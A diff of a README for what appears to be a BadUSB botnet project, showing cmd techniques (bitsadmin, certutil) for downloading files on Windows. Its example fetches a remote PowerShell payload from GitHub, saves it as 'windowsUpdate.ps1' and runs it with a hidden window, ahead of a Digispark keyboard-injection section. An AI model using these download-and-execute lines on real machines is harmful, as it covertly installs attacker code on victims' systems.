@@ -124,17 +124,21 @@ ENTER
 ## Option 3 (with cmd)
 Windows Powershell is too slow at startup, so we can use cmd to download the '.ps1' file and execute it. To download a file with cmd, we can use two options: ```bitsadmin``` or ```certutil.exe```. (Certutil is not installed by default on XP/Win2003 but is avaialble on the newer windows versions. For XP/2003 you'll need the Admin Tool Pack for windows server 2003).
 
+### Syntax
+
 ```cmd
 bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip
 certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
 ```
+
+### Example
 
 ```cmd
 > certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" Documents\windowsUpdate.ps1
 > powershell.exe -windowstyle hidden -file Documents\windowsUpdate.ps1
 ```
 
-### Digispark
+#### Example on Digispark
 
 ```c
 #define kbd_es_es
